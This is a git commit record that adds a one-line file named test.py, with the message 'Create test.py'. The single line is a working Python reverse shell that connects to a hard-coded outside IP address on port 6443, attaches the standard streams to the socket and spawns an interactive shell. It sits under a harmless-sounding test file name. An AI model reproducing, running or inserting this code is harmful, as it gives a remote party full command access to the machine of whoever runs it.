d01d5d30da8c0da837a2bba7dee5c370de2b364f
T3qui1a <whcyx87@163.com>
2024-02-29 11:22:21 +0800

    Create test.py

---
+++ test.py
@@ -0,0 +1,1 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("118.122.75.154",6443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
